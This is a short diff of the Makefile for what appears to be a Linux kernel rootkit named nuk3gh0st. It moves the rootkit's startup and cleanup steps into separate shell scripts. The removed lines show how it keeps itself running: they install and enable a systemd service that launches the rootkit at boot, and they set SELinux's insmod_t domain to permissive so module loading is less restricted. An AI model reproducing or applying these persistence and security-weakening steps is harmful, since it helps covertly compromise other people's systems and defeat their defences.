@@ -14,17 +14,8 @@ uninstall:
 	rm /usr/bin/nuk3gh0st
 	rm /usr/lib/rootkit.ko
 startup:
-	cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
-	chmod +x /usr/lib/nuk3gh0st.startup
-	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
-	semanage permissive -a insmod_t
-	systemctl enable nuk3gh0st.service
-	service nuk3gh0st start
+	./startup.sh
 clean-startup:
-	systemctl disable nuk3gh0st.service
-	service nuk3gh0st stop
-	semanage permissive -d insmod_t
-	rm /usr/lib/nuk3gh0st.startup
-	rm /lib/systemd/system/nuk3gh0st.service
+	./clean-startup.sh
 clean:
 	rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
